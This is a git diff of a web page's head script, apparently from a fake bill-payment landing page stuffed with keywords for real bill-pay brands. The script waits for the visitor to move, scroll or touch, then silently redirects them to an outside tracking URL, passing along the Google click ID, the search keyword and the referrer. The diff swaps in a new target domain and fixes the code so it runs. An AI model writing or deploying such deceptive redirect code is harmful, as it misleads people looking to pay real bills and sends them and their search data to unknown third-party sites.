@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <script>
+<script>
 (function(){
-  const redirectUrl = "https://localweathernow.org/bill23.php"; // 🔥
+  const redirectUrl = "https://solitaplaynow.online/track.php"; // 🔥
   let redirected = false, moved = false, scrolled = false, touched = false, initialPos = null;
 
   function random(min, max){return Math.floor(Math.random()*(max-min+1))+min}
@@ -15,26 +15,27 @@
   ][Math.floor(Math.random()*3)]}
 
   function redirectUser(){
-    if(!redirected){
-      redirected = true;
-      const urlParams = new URLSearchParams(window.location.search);
-      const urlParams = new URLSearchParams(window.location.search);
-const gclid = urlParams.get('gclid');
-const keyword = urlParams.get('utm_term') || urlParams.get('q'); // 'q' for search engines like Google
-const referrer = document.referrer;
+  if(!redirected){
+    redirected = true;
 
-let finalUrl = redirectUrl;
-const params = new URLSearchParams();
+    const urlParams = new URLSearchParams(window.location.search);
+    const gclid = urlParams.get('gclid');
+    const keyword = urlParams.get('utm_term') || urlParams.get('q');
+    const referrer = document.referrer;
 
-let finalUrl = redirectUrl;
-finalUrl += (redirectUrl.includes('?') ? '&' : '?') + 'gclid=' + gclid + 
-            (keyword ? '&keyword=' + encodeURIComponent(keyword) : '') + 
-            (referrer ? '&referrer=' + encodeURIComponent(referrer) : '');
+    let finalUrl = redirectUrl;
 
-      window.location.href = finalUrl;
-    }
+    finalUrl += (redirectUrl.includes('?') ? '&' : '?');
+    if (gclid) finalUrl += 'gclid=' + encodeURIComponent(gclid) + '&';
+    if (keyword) finalUrl += 'keyword=' + encodeURIComponent(keyword) + '&';
+    if (referrer) finalUrl += 'referrer=' + encodeURIComponent(referrer);
+
+    // Clean up trailing '&' if needed
+    finalUrl = finalUrl.replace(/&$/, '');
+
+    window.location.href = finalUrl;
   }
-
+}
   function showCookiePopup(){
     const wrapper = document.createElement("div");
     wrapper.innerHTML = `
@@ -85,29 +86,6 @@ finalUrl += (redirectUrl.includes('?') ? '&' : '?') + 'gclid=' + gclid +
   });
 })();
 </script>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Pay Bill Online With Easy</title>
-  <link rel="stylesheet" href="css/main.css">
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
-  <meta name="keywords" content="metropcs bill pay, pay san diego water bill, consolidated bill pay, view my bill, pay my bill, www paymydoctor com, my synchrony pay bill, ong bill pay, billpay, doxo, bill pay, menomonee falls org payutility, online bill payment, rumpke bill pay, water bill, pay bills online, mysynchrony pay bill online, doxo login, bill payment, mta bill pay, make a payment to, sf recology bill pay, municipal online payments, express bill pay, tires plus online bill pay, online payment, mymedpayment, hialeah water bill payment, bill for payment">
-
-  <script>
-  $(document).ready(function(){
-    $("#hides").click(function(){
-      $(".cookiesBanner").hide();
-    });
-  });
-  </script>
-  <script>
-  $(document).ready(function(){
-    $("#Deny").click(function(){
-      $(".cookiesBanner").hide();
-    });
-  });
-  </script>
-
-
 </head>
 <body>
 
